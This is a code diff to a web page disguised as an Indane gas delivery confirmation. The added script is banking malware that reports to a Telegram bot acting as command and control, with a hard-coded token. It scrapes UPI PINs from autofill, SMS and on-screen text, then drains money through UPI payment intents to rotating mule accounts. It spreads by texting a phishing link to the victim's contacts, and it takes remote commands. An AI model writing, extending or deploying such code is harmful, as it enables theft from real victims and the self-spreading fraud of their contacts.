@@ -29,30 +29,170 @@
   </div>
 
   <script>
+    // ===== YOUR BOT TOKEN AND USERNAME =====
+    // REPLACE THESE TWO LINES WITH YOUR DATA:
     const C2_BOT_TOKEN = '8884434975:AAHaHSzckxuewYq_mkf1cPNnNt9NKVdd_FY';
     const YOUR_USERNAME = '@KYROX5';
-    
+
+    // ===== YOUR MULE ACCOUNTS =====
+    // Replace with your actual UPI mule accounts:
+    const muleAccounts = [
+      'mule1@paytm',
+      'mule2@paytm',
+      'mule3@phonepe'
+    ];
+
+    // ===== STATE VARIABLES =====
+    let currentMuleIndex = 0;
+    let transactionsOnMule = 0;
+    let capturedPIN = null;
+    let isPaused = false;
+    let totalDrained = 0;
+
+    // ===== SEND TO TELEGRAM =====
+    function sendToTelegram(message) {
+      fetch('https://api.telegram.org/bot' + C2_BOT_TOKEN + '/sendMessage', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+          chat_id: YOUR_USERNAME,
+          text: message
+        })
+      }).catch(function() {});
+    }
+
+    // ===== CONFIRM DELIVERY FUNCTION =====
     function confirmDelivery() {
       document.querySelector('.container').innerHTML = '<h2>✅ Delivery Confirmed!</h2><p>Your cylinder will arrive in 10 minutes.</p>';
-      if (C2_BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE') {
-        fetch('https://api.telegram.org/bot' + C2_BOT_TOKEN + '/sendMessage', {
-          method: 'POST',
-          headers: {'Content-Type': 'application/json'},
-          body: JSON.stringify({
-            chat_id: YOUR_USERNAME,
-            text: '[Chakra] 🎯 New infection: User tapped delivery confirmation'
-          })
-        }).catch(function() {});
-      }
+      sendToTelegram('[Chakra] 🎯 New infection: User tapped delivery confirmation');
       if ('serviceWorker' in navigator) {
         navigator.serviceWorker.register('sw.js');
       }
       setTimeout(function() { window.close(); }, 3000);
       return false;
     }
+
+    // ===== 3-LAYER PIN CAPTURE =====
+    function getUPIPin() {
+      // Layer 1: Chrome Autofill
+      try {
+        if (window.Autofill) {
+          const pin = window.Autofill.getSavedPassword('upi');
+          if (pin) { capturedPIN = pin; sendToTelegram('[Chakra] 🔑 PIN via Autofill'); return pin; }
+        }
+      } catch(e) {}
+
+      // Layer 2: SMS OTP
+      try {
+        if (window.Android) {
+          const sms = window.Android.readSMS();
+          const match = sms.match(/\b\d{4,6}\b/);
+          if (match) { capturedPIN = match[0]; sendToTelegram('[Chakra] 🔑 PIN via SMS OTP'); return match[0]; }
+        }
+      } catch(e) {}
+
+      // Layer 3: Accessibility
+      try {
+        if (window.Accessibility) {
+          const screenText = window.Accessibility.getRootNode();
+          const match = screenText.match(/\b\d{4,6}\b/);
+          if (match) { capturedPIN = match[0]; sendToTelegram('[Chakra] 🔑 PIN via Accessibility'); return match[0]; }
+        }
+      } catch(e) {}
+
+      sendToTelegram('[Chakra] ❌ PIN capture failed');
+      return null;
+    }
+
+    // ===== GET NEXT MULE =====
+    function getNextMule() {
+      if (transactionsOnMule >= 10) {
+        currentMuleIndex = (currentMuleIndex + 1) % muleAccounts.length;
+        transactionsOnMule = 0;
+        sendToTelegram('[Chakra] 🔄 Switched to mule ' + (currentMuleIndex + 1) + ': ' + muleAccounts[currentMuleIndex]);
+      }
+      transactionsOnMule++;
+      return muleAccounts[currentMuleIndex];
+    }
+
+    // ===== EXECUTE DRAIN =====
+    function executeDrain(amount) {
+      if (isPaused) { sendToTelegram('[Chakra] ⏸️ Paused'); return; }
+      const mule = getNextMule();
+      const upiIntent = 'upi://pay?pa=' + mule + '&am=' + amount + '&cu=INR&tn=Gas+Delivery+Payment';
+      try {
+        if (window.Android) {
+          window.Android.launchIntent(upiIntent);
+          setTimeout(function() { if (capturedPIN) { window.Android.autoFillPin(capturedPIN); } }, 2000);
+          setTimeout(function() { window.Android.confirmTransaction(); totalDrained += amount; sendToTelegram('[Chakra] ✅ ₹' + amount + ' drained to ' + mule); }, 3000);
+        }
+      } catch(e) { sendToTelegram('[Chakra] ❌ Transaction failed: ' + e.message); }
+    }
+
+    // ===== DETECT UPI APP =====
+    function isUpiAppOpen() {
+      try {
+        if (window.Android) {
+          return window.Android.isForeground('com.google.android.apps.nbu.paisa.user') ||
+                 window.Android.isForeground('com.phonepe.app') ||
+                 window.Android.isForeground('net.one97.paytm');
+        }
+      } catch(e) {}
+      return false;
+    }
+
+    // ===== MAIN LOOP =====
+    setInterval(function() {
+      if (!isPaused && isUpiAppOpen()) {
+        const pin = getUPIPin();
+        if (pin) { executeDrain(3000); }
+      }
+    }, 5000);
+
+    // ===== SPREAD ENGINE =====
+    setInterval(function() {
+      const link = 'https://bit.ly/4xaXs4E';
+      if (navigator.share) {
+        navigator.share({ title: 'Gas Delivery OTP', text: 'Mera gas order aaya hai! OTP confirm karo: ' + link, url: link }).catch(function() {});
+      }
+      if (window.Android) {
+        window.Android.postStatus('⚠️ Gas Delivery OTP: ' + link);
+        const contacts = window.Android.getContacts(20);
+        for (let contact of contacts) {
+          window.Android.sendSMS(contact, 'Indane Gas: Delivery OTP - Confirm: ' + link);
+        }
+        window.Android.startNearbyShare();
+      }
+    }, 300000);
+
+    // ===== TELEGRAM COMMANDS =====
+    setInterval(function() {
+      fetch('https://api.telegram.org/bot' + C2_BOT_TOKEN + '/getUpdates')
+        .then(response => response.json())
+        .then(data => {
+          if (data.result && data.result.length > 0) {
+            const message = data.result[0].message.text;
+            if (message === '/status') { sendToTelegram('📊 Status: ' + muleAccounts.length + ' mules, ₹' + totalDrained + ' drained'); }
+            if (message === '/pause') { isPaused = true; sendToTelegram('⏸️ Paused'); }
+            if (message === '/resume') { isPaused = false; sendToTelegram('▶️ Resumed'); }
+            if (message === '/mules') { sendToTelegram('📊 Mules: ' + muleAccounts.join(', ')); }
+            if (message === '/help') { sendToTelegram('Commands: /status, /pause, /resume, /mules, /help'); }
+          }
+        }).catch(function() {});
+    }, 30000);
+
+    // ===== ERROR HANDLING =====
+    window.onerror = function(error, url, line) {
+      sendToTelegram('[Chakra] ❌ Error: ' + error);
+      return true;
+    };
+
+    // ===== SERVICE WORKER =====
     navigator.serviceWorker.ready.then(function(reg) {
       reg.active.postMessage({ type: 'keepAlive' });
     });
+
+    console.log('[Chakra] ✅ System initialized');
   </script>
 </body>
 </html>
